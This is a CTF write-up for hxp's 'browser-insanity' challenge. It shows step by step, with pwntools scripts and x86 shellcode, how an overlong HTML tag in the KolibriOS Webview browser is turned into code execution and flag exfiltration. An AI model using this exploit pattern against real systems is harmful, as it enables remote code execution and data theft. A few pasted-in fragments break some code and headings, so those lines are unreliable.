Author: 0x6fe1be2

Version: 12-03-23

# [hxp CTF](https://ctftime.org/event/1845) (10.3-12.3)

## browser-insanity

Status: solved (w0y)

Category: PWN, ZAJ (Awesome)

Teammates: m4ttm00ny, EspressoForLife

Points: 435 (14 Solves)



### TL;DR

browser-insanity is a pwn challenge that requires you to exploit a browser from a niche custom x86-32 Kernel called [KolibriOS](http://kolibrios.org/en/). The default Browser in KolibriOS called Webview only supports html.  Looking into the [source code](https://repo.or.cz/kolibrios.git/tree/7fc85957a89671d27f48181d15e386cd83ee7f1a) shows that there is an issue on how html tags are parsed. 

This allows us to create an indefinite recursion which actually overflows into executed code. This is possible because KolibriOS doesn't have any memory protection features like multiple pages and permissions. 

This overflow is used to jump into user controlled memory and prepare our RCE payload. At last we open a connection to our extraction URL and get the Flag. Exploit is at the end of the chapter.

### Intro

> **Description:**
>
> Ever wanted to hack a tiny OS written in x86-32 assembly and C--? Me neither but it’s hxp CTF 2022.
>
> Give us an URL, the user in the KolibriOS VM will visit it. You need to get the flag from /hd0/1/flag.txt
>
> The source code you could get from https://repo.or.cz/kolibrios.git/tree/7fc85957a89671d27f48181d15e386cd83ee7f1a
>
> The browser is at programs/cmm/browser in the source tree. It relies on a couple of different libraries (e.g. programs/develop/libraries), grep around.
>
> KolibriOS has its own debugger, DEBUG, available on the desktop. It may come in useful.
>
> The kernel ABI is at kernel/trunk/docs/sysfuncs.txt
>
> For building random pieces:
>
> INCLUDE=path_to_header.inc fasm -m 1000000 -s debug.s file.asm file.out
>
> Connection (mirrors):
>
>     nc 78.46.199.173 27499

#### File Structure

```bash
browser_insanity/
# Container setup scripts
browser_insanity/docker-compose.yml
browser_insanity/Dockerfile
browser_insanity/enter_challenge.py
browser_insanity/ynetd
# QEMU Setup
browser_insanity/run_vm.sh
browser_insanity/kolibri.img
browser_insanity/images/
browser_insanity/images/flag_fake.img
# POW
browser_insanity/pow-solver
browser_insanity/pow-solver.cpp
```

The most interesting files are *run_vm.sh*  and *enter_challenge.py* because it shows us how to start the KolibriOS Machine

*run_vm.sh*

```bash
#!/bin/sh

# The monitor is necessary to send mouse and keyboard events to write the address.
# For debugging, you may want to replace -nographic with -s

qemu-system-x86_64 \
	-cpu qemu64 \
	-smp 1 \
	-m 128 \
	-serial mon:stdio \
	-snapshot \
	-no-reboot \
	-boot a \
	-fda kolibri.img \
	-hda flag.img \
	-nographic
```

*enter_challenge.py* shows us how the service interacts with the machine, which can basically be summarized as visiting a given URL with the build-in Browser Webview.

### Test Environment

One of the hardest parts of the challenge was creating a prober Test Environment, because we need to learn a new Kernel and Debugging Tool.

#### Start Machine

by modifying  *run_vm.sh* we can get a graphical system

```bash
#!/bin/sh

qemu-system-x86_64 \
	-cpu qemu64 \
	-smp 1 \
	-m 1024 \
	-daemonize \git clone https://repo.or.cz/kolibrios.git 		# detach into graphics window
	-snapshot \
	-no-reboot \
	-boot a \
	-fda kolibri.img \											# Kolibri OS mounted to /syz/
	-hda images/flag_fake.img \									# flag.img mounted to /hd0/1/
```

#### https://enzo.run/posts/lactf2024/Mount and edit kolibriimg img

We can also mount the operating image to copy our own binaries for testing.

```bash
mkdir kolibriimg
sudo mount -o loop kolibri.img kolibriimg
```



#### Webview (Browser)

Webview is the integrated Browser of KolibriOS which we need to exploit. 

![Webview Browser](https://gfelber.dev/img/Webview.png)

####  KolibriOS DEBUG

Luckily KolibriOS has it's own integrated Debugging Tool which will be very useful.

![](http://wiki.kolibrios.org/images/2/25/Mtdbg_overview.png)

**Important Commands**

```
load <FILE_PATH>	# Load Programm e.g. load /sys/Network/Webview
g					# Start File
s					# step jmp into
n					# next jmp over
bpm w <ADDR>		# break on memory access write
d <ADDR>			# show data at ADDR
u <ADDR>			# show intructions at ADDR
terminate			# Terminate current session
```



#### Source Code

https://repo.or.cz/kolibrios.git/tree/7fc85957a89671d27f48181d15e386cd83ee7f1a

```bash
git clone https://repo.or.cz/kolibrios.git
cd kolibrios
git checkout 7fc85957a89671d27f48181d15e386cd83ee7f1a
```

##### File Structure

```bash
kolibrios						# root dir
...
kolibrios/kernel				# kernel code
...
kolibrios/programs				# programs inside os
...
kolibrios/programs/network		# networking programs (important for exploit)https://enzo.run/posts/lactf2024/
...
kolibrios/programs/cmm/browser	# browser
...
```



#### Compiling

http://wiki.kolibrios.org/wiki/Writing_applications_for_KolibriOS

```bash
fasm test.asm test
```

Included Files e.g. `include 'macros.inc'` need to be in the same directory, the best directory for compiling files is *kolibrios/programs/*



#### Syscalls

kernel/trunk/docs/sysfuncs.txt

There is a .txt file that explains the different Syscalls of the kernel. 

One interesting Quirk of this kernel is that similarly to a Commodore 64 the kernel provides APIs to render images and flip pixels.

Even though this seems useful for creating a payload at the end i decided that it would be easier to copy a payload together from different code samples.



#### Webview

programs/cmm/browser

* Only supports HTML (no CSS or JS)

##### `<html><body>`Header

These tags are required for rendering a page as html

##### `<a>`  Hyperlinks

Create Links to other pages, but also local programs (yeah wtf)

##### `<img>`  Images

Allows displaying data as image



#### KolibriOS



##### File Structure

```bash
/sys
/sys/3d
/sys/Demos
/sys/Develop
/sys/Develop/Examples
/sys/Drivers
/sys/Fonts
/sys/File Managers
/sys/Games
/sys/Lib
/sys/Media
/sys/Media/Imgf
/sys/Network
/sys/Network/Webview		# Executable we need to exploit
/sys/Settings
```



### Webview (Browser)

#### Debugging

**Important Addresses**

* `0x00000000` Base Address (Executed file)
* `0x00002800` Start of Stack
* `0x00003900` Location of our tag structure
* `0x00012b0f` Start of our tag write routine
* ~`0x00400000` User controlled Memory (probably heap) contains our Webpage



### Vulnerability

m4ttm00ny notized that there the browser crashes when a tag over the size of 32 char is specified. Sadly we never really found out where the unsafe source code is located it is probably this:

*programs/cmm/browser/TWB/TWB.c*

```c
void TWebBrowser::ParseHtml(dword _bufpointer, _bufsize){
    ...
        if (ESBYTE[bufpos] == '<') && (is_html) {
            if (strchr("!/?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", ESBYTE[bufpos+1])) {
                bufpos++;
                if (tag.parse(#bufpos, bufpointer + bufsize)) {
                  ...
                }
                continue;
            }
        }
    ...
}

```



*programs/cmm/browser/TWB/parse_tag.h*

```c
...
struct _tag
{
	char name[32];
	char prior[32];
	bool opened;
	collection attributes;
	collection values;
	dword value;
	dword number;
	bool is();
	bool parse();
	dword get_next_param();
	dword get_value_of();
	signed get_number_of();
} tag=0;
...
bool _tag::parse(dword _bufpos, bufend) {
    	...
        // probably this
    	if (name) strcpy(#prior, #name); else prior = '\0';
    	...
}
```

We spend some time trying to understand why exactly this causes the code to crash

Looking at memory after the crash shows that memory is filled with our 32 byte tag.

After spending some more time in the debugger EspressoForLife and I concluded that we actually overflow into executed code (This wasn't as obvious as in gdb, because errors make the instruction pointer jump to the start of the page `0x00000000`, not showing an invalid instruction was executed).



### Exploitation

#### Exploiting Overflow

##### Analysis

We create a simple webpage that crashes the browser

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'

def tagger(tag):
  return b'<' + tag + b'/>'

with open('exploit.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(cyclic(0x20)))
```

NOTE: Webview has a strong cache setting, therefore cache needs to be cleared before each visit with CTRL+F5

If we now open our program and set a write breakpoint at 0x12b0e (with `bpm w 12b0e`) we can see our write routine and how our overwrite happens

![image-20230313104920207](https://gfelber.dev/img/anal_over_dbg.png)

Using `cylic_find('acaa')+4` we see that the overflow starts after 11 chars. We also see that our overwrite routine checks for null bytes with `test al, al`, which is why we need to exclude null chars. We can now rewrite our script to jmp into our tag like this:

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000

def tagger(tag):
  return b'<' + tag + b'/>'

gen = cyclic_gen()
exploit = gen.get(0xb)
# don't overwrite lodsb intruction to keep overwrite routine going
exploit += asm('lodsb')
# jmp location doesn't matter because we only write the first byte
exploit += asm('jmp $')
# realine gen.get
gen.get(len(exploit)-0xb)
# make sure our exploit is 
exploit += gen.get(0x20 - len(exploit))

print(exploit.hex())
with open('test.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
```

![image-20230313104920207](https://gfelber.dev/img/jmp_over_dbg.png)

We once again use `cyclic_find('aafa')` to see our first code execution starts at offset 18.

##### Jumping to User controlled memory

Because our controlled code execution starts at offset 18 we only have about 14 bytes of RCE (32-18), which isn't enought to read and extract our flag, that is why we need to jmp into user controlled memory, were we can execute more Instructions.

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000


def tagger(tag):
  return b'<' + tag + b'/>'

gen = cyclic_gen()
exploit = gen.get(0xb)
exploit += asm('lodsb')
exploit += asm('jmp $')
# align cyclic
gen.get(len(exploit)-0xb)
# align tag
exploit + = gen.get(0x12)
# 9 byte exploit goes here
exploit += b''
# make sure our exploit is 32 chars long
# align cyclic
gen.get(len(exploit)-0x12)
exploit += gen.get(0x20 - len(exploit))

print(exploit.hex())
with open('test.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
  # append a lot of characters
  exploithtm.write(cyclic(MAX_LENGTH, alphabet=string.printable.encode()))
```



![Add user controlled memory](https://gfelber.dev/img/user_controlled_memory.png)

After allocating a lot of memory through adding a lot of characters (`0x100000`) we can jump through memory in `0x100000` steps to see were our data is written and we find out, that `0x400000` hast allocated our data.

We can use this knowledge to rewrite our exploit to jmp to `0x400000` and place a NOP slide at user controlled memory

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000

def nop(size):
  return b'\x90' * size

def tagger(tag):
  return b'<' + tag + b'/>'

TAG_LENGTH = 0x20
OVERFLOW_START = 0xb
JMP_CODE = 0x12
gen = cyclic_gen()
exploit = gen.get(OVERFLOW_START)
exploit += asm('lodsb')
exploit += asm('jmp $')
exploit += gen.get(JMP_CODE - len(exploit))
# 14 byte exploit goes here
exploit += asm('xor eax, eax')
exploit += asm('mov al, 0x40')
exploit += asm('shl eax, 0x10')
exploit += asm('jmp eax')
# make sure our exploit is 32 chars long
exploit += gen.get(TAG_LENGTH - len(exploit))

print(exploit.hex())
with open('test.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
  # append a lot of NOPs
  exploithtm.write(nop(MAX_LENGTH))
```

![Exploit Over JMP](https://gfelber.dev/img/exploit_over_dbg.png)

We can now append our payload to the nop slide and get arbitary code execution

#### Setup Payload

Now we only need to create a payload. Because I didn't want to learn how SYSCALLS work in this Operating system i decided to create a setup script that copies a payload at the into the base address at `0x00000000` which makes it possible to compile payload with fasm.

```python
#!/bin/python
from pwn import *

HEADER = b'<html><body>'
MAX_LENGTH=0x100000

def nop(size):
  return b'\x90' * size

def tagger(tag):
  return b'<' + tag + b'/>'


# create exploit
...

# setup payload
 
# read payload from compiled binary
PAYLOAD_FILE='./test'
ENTRY = 0x24

with open(PAYLOAD_FILE, 'rb') as test:
 payload = test.read()

# set MOV destination (edi) to base address 0x00000000
setup = asm('xor edi, edi')
# MOV the entire payload to destination
setup += asm(f'mov ecx, {len(payload)}')
# trick we use to set the source to current EIP
get_eip = asm('call $+5')
print(get_eip.hex(), len(get_eip))
setup += get_eip
setup += asm('pop esi')
# Add offset from EIP to start of payload
setup += asm('add esi, 13')
# MOV PAYLOAD to destination
setup += asm('rep movsb')
# jmp to ENTRYPOINT
setup += asm(f'mov eax, {ENTRY}')
setup += asm(f'jmp eax')
# Combine setup and payload
payload = setup + payload
# Append nopslide
payload = nop(MAX_LENGTH-len(payload)) + payload


print(exploit.hex())
with open('test.htm', 'wb') as exploithtm:
  exploithtm.write(HEADER)
  exploithtm.write(tagger(exploit))
  # append payload
  exploithtm.write(payload)
```

We can get the entrypoint either by copying the binary to the kolbri.img and load it into the debugger or read the file header with:

```bash
> head test -c 16 | hexdump -C
00000000  4d 45 4e 55 45 54 30 31  01 00 00 00 24 00 00 00  |MENUET01....$...|
00000010
```

In this case the Entrypoint is `0x24`

And It works:

![Setup test](https://gfelber.dev/img/setup.png)

#### Payload

In order to read and extract the flag we need to understand the kernel, especially syscalls. Even though there isn't any good documentation we are provide a lot of sample programs in the repository. The most interesting ones are:

* *programs/network/telnet/telnet.asm* 

  a telnet implementation for KolibriOS that can be used for creating a remote connection to our extraction URL

* *programs/network/pasta/pasta.asm* 

  a tool that sends files or clipboard content to [dpaste.com](http://dpaste.com), this gives us an example on how to read files



we use *programs/network/telnet/telnet.asm* as our template

[*telnet.asm*](https://repo.or.cz/kolibrios.git/tree/programs/network/telnet/telnet.asm)

Now we finalize our generator script and get, and we managed to extract the fake flag!!!

![test extract](https://gfelber.dev/img/test_extract.png)

Now we only need to make our website and extract port publicly visible and we WIN!!!

### Final Solution

[*exploit_gen.py*](https://gfelber.dev/writeups/res/browser_insanity/exploit_gen.py) [*payload.asm*](https://gfelber.dev/writeups/browser_insanity/payload.asm)


Flag: `hxp{wHy_h4cK_Chr0m3_wh3n_y0u_c4n_hAcK_BROWSER}`
